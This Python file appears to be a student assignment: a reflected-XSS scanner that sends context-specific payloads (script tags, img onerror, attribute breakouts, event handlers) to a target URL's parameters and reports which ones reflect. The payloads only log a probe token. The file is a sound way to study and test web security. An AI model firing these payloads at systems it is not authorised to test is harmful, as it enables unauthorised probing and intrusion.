import requests
import urllib.parse
import re
from enum import Enum
from dataclasses import dataclass
from typing import List, Dict, Optional

# --- Configuration & Enums ---

class InjectionContext(Enum):
    TEXT_NODE = "text_node"           # <div>PAYLOAD</div>
    ATTRIBUTE_VALUE = "attr_value"    # <input value="PAYLOAD">
    ATTRIBUTE_NAME = "attr_name"      # <div PAYLOAD="x"> or <div PAYLOAD>
    SCRIPT_TAG = "script_tag"         # <script>var x = 'PAYLOAD';</script>

@dataclass
class ScanResult:
    url: str
    parameter: str
    method: str
    context: InjectionContext
    payload: str
    reflected: bool
    response_code: int

# --- Payload Generator ---

class PayloadGenerator:
    """
    Generates payloads adapted for specific HTML contexts.
    """
    
    def __init__(self):
        # A unique token to verify reflection without triggering alerts during initial probing
        self.probe_token = "XSSPROBE" + str(12345) 

    def get_payloads(self, context: InjectionContext = None) -> Dict[InjectionContext, List[str]]:
        """
        Returns a dictionary of payloads keyed by context. 
        If a specific context is requested, only that list is returned.
        """
        payloads = {}

        # 1. Text Node / Generic HTML Body
        # Context: <div>[INPUT]</div>
        # Goal: Inject a new tag.
        text_payloads = [
            f"<script>console.log('{self.probe_token}')</script>",
            f"<img src=x onerror=console.log('{self.probe_token}')>",
            f"<!-- {self.probe_token} -->" # Simple reflection check
        ]
        payloads[InjectionContext.TEXT_NODE] = text_payloads

        # 2. Attribute Value
        # Context: <input value="[INPUT]">
        # Goal: Break out of the attribute quote and add an event handler or new tag.
        attr_val_payloads = [
            f'"{self.probe_token}',                 # Basic quote breakout check
            f'"><script>console.log({self.probe_token})</script>', # Break out of tag
            f'" onmouseover="console.log(\'{self.probe_token}\')', # Event handler injection
            f"' onmouseover='console.log(\'{self.probe_token}\')", # Single quote variant
        ]
        payloads[InjectionContext.ATTRIBUTE_VALUE] = attr_val_payloads

        # 3. Attribute Name (Required by assignment)
        # Context: <div [INPUT]="something"> or <div [INPUT]>
        # Goal: Inject a new attribute like onclick, or close the tag.
        # Example from prompt: <tag testpayload=123>
        attr_name_payloads = [
            self.probe_token,                      # Just checking if the name reflects
            f'style=expression(console.log({self.probe_token}))', # Legacy IE vector (good for detection)
            f'autofocus onfocus=console.log({self.probe_token})', # Modern attribute injection
            f'>{self.probe_token}<'                # Attempt to close the tag from the attribute name pos
        ]
        payloads[InjectionContext.ATTRIBUTE_NAME] = attr_name_payloads

        if context:
            return {context: payloads.get(context, [])}
        return payloads

# --- The Scanner ---

class XSSScanner:
    def __init__(self, target_url: str, method: str = "GET", headers: dict = None):
        self.target_url = target_url
        self.method = method.upper()
        self.headers = headers or {"User-Agent": "Python-XSS-Scanner/1.0"}
        self.generator = PayloadGenerator()
        self.results: List[ScanResult] = []

    def scan(self, params: Dict[str, str]):
        """
        Iterates through parameters and injection contexts to test for reflections.
        params: Initial values for parameters (e.g., {'q': 'search', 'id': '1'})
        """
        print(f"[*] Starting scan on {self.target_url} with method {self.method}")
        
        all_payloads_map = self.generator.get_payloads()

        for param_name in params.keys():
            print(f"[*] Testing parameter: {param_name}")
            
            # Iterate through every context type we defined
            for context, payload_list in all_payloads_map.items():
                for payload in payload_list:
                    
                    # specific check for attribute name injection requiring unique formatting
                    # if checking attribute name, we might want to simulate <tag PARAM=val>
                    # For this simple scanner, we treat the payload as the raw value sent.
                    
                    # Prepare data
                    test_params = params.copy()
                    test_params[param_name] = payload

                    try:
                        response = self._send_request(test_params)
                        reflected = self._analyze_response(response, payload)
                        
                        result = ScanResult(
                            url=self.target_url,
                            parameter=param_name,
                            method=self.method,
                            context=context,
                            payload=payload,
                            reflected=reflected,
                            response_code=response.status_code
                        )
                        self.results.append(result)

                        if reflected:
                            print(f"    [!] REFLECTION FOUND in {context.value}: {payload}")

                    except requests.RequestException as e:
                        print(f"    [x] Request failed: {e}")

    def _send_request(self, data: Dict[str, str]):
        if self.method == "GET":
            return requests.get(self.target_url, params=data, headers=self.headers, timeout=5)
        elif self.method == "POST":
            return requests.post(self.target_url, data=data, headers=self.headers, timeout=5)
        else:
            raise ValueError("Unsupported method")

    def _analyze_response(self, response, payload: str) -> bool:
        """
        Simple reflection detection. 
        In a real scanner, you would parse the HTML to see WHERE it reflected.
        For this assignment, substring match is sufficient.
        """
        return payload in response.text

    def generate_report(self):
        print("\n" + "="*60)
        print(f"SCAN REPORT FOR {self.target_url}")
        print("="*60)
        
        found_vulns = [r for r in self.results if r.reflected]
        
        if not found_vulns:
            print("No reflections detected.")
            return

        print(f"{'PARAMETER':<15} | {'CONTEXT':<15} | {'PAYLOAD':<25}")
        print("-" * 60)
        
        for r in found_vulns:
            print(f"{r.parameter:<15} | {r.context.value:<15} | {r.payload:<25}")
        
        print("\nTotal reflections found:", len(found_vulns))
        print("="*60)

# --- Main Execution ---

if __name__ == "__main__":
    # --- CONFIGURATION ---
    print("--- Reflected XSS Scanner ---")
    
    # Get URL from user input
    default_url = "http://localhost:8000/vulnerable_page.php"
    user_url = input(f"Enter target URL (default: {default_url}): ").strip()
    
    # Ensure scheme exists
    if user_url and not user_url.startswith(('http://', 'https://')):
        user_url = 'http://' + user_url
        
    TARGET = user_url if user_url else default_url
    
    # Parameters to fuzz
    PARAMETERS = {
        "q": "search_term",
        "user_input": "default",
        "id": "1"
    }

    # --- RUN SCANNER ---
    print(f"[*] Target set to: {TARGET}")
    
    try:
        # Example 1: Scanning using GET
        scanner = XSSScanner(TARGET, method="GET")
        
        # Run the actual scan against the user-provided URL
        scanner.scan(PARAMETERS)
        scanner.generate_report()
        
    except requests.exceptions.ConnectionError:
        print(f"\n[!] Error: Could not connect to {TARGET}")
        print("    Please ensure the target server is running and accessible.")
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
